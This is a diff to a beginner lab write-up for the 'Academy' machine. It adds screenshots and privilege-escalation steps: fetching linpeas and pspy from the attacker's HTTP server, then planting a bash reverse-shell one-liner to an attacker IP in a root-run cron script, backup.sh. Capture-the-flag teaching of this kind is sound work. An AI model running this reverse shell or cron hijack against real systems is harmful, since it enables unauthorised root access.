@@ -707,6 +707,7 @@ $ nc -nvlp 1234
 
 
 ```
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/listening.png)
 
 Now go to the **Student Registeration** & **Upload image** 
 
@@ -714,6 +715,8 @@ Now go to the **Student Registeration** & **Upload image**
 ![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/ef2a1d1f4ec504a1ffa12207eb4df8c8fd600a31/Academy/images/upload.png)
 
 And check the terminal we got a shell !
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/gotshell.png)
 
 Now we are not the root user so we might need to perfrom some privilege escalation here
 
@@ -737,6 +740,8 @@ In the shell we got use `wget` to get the `linpeas.sh`  from our server
 ```
 wget http://[Attacker Box ip]/linpeas.sh
 ```
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/sendingpeas.png)
 
 Now let's run our script before that we have to make it executable
 
@@ -784,19 +789,107 @@ Okay now we have more info ! let's try to `ssh` to `grimmie@[ip]`
 $ ssh grimmie@[targetip]
 password: [password you found]
 ```
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/ssh.png)
 
 We are in !
 
 We still do not have sudo access
 
-Now lets check the backup.sh file
+Let's the running processes information by using`ps` command
+
+You can also do this using :
+- `Crontab` - Crontab is a command-line utility in Unix-based systems used to schedule tasks to run automatically at specified intervals. These tasks, often called "cron jobs," can range from running a script or command to performing system maintenance.
+- `crontab -e`: Edit your crontab file to add, remove, or change scheduled tasks.
+
+- `crontab -l`: List all your current crontab entries (to see what tasks are already scheduled).
+
+- `systemctsystemctl list-timers` -Check if any scripts are running in any schedule
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/scheduleservices.png)
+
+The `ps` command in Linux is used to display information about currently running processes on your system. A process is essentially a running instance of a program, and each process has a unique Process ID (PID).
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/ps.png)
+
+There is also a tool called  `pspy` - Shows all processes running on the target machine
+
+you can find it [**here**](https://github.com/DominicBreuker/pspy)
+
+Download the 64 bit static version "`pspy64`"
+
+Move this to the folder where you want to host this file
+
+now let's again start a server using `python3` in a **new terminal*
+
 ```
-$ cd /home/grimmie
+python -m http.server 80
+```
+
+In the shell we have type this  to get the file
+
+```
+wget http://[your ip]/pspy64
+
+```
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/pspy64.png)
+
+Make it executable and run it
+
+```
+chmod +x pspy64
+./pspy64
+```
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/pspy64work.png)
+
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/backup.png)
+
+Now we see that  `backup.sh` is running by the root user it's a good thing !
+
+## Getting Root !
+
+
+Okay setup a **listener** on `port 8081` in a new terminal
+```
+nc -nvlp 8081
+Listening on [any] 8081 ... 
+```
+
+We have to search for any one liner code online for bash then we can get a reverse shell. 
+
+i found this from [**here**](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+```
+bash -i >& /dev/tcp/[your ip]/8081 0>&1
+
+```
+we will put this code into our `backup.sh` file we got and when that backup.sh keeps on executing we'll get a `reverse shell` of root user
+
+```
+nano backup.sh
+
+// Delete lines using CTRL + Kernel
+[Paste it here]
+```
+CTRL + x to save and exit
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/shellonroot.png)
+
+And we got a shell!
+```
+$ cd /root
 $ ls
-backup.sh
-
-$ cat backup.sh
-
+$ cat flag.txt
 ```
 
-writing ....
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/cf3e34f84370b3d8784b64bc250d010a760648ca/Academy/images/falg.png)
+
+
+Done ! 
+
+i had a lot of fun doing this.
+
+
+```
+3 Down 2 to go
+```
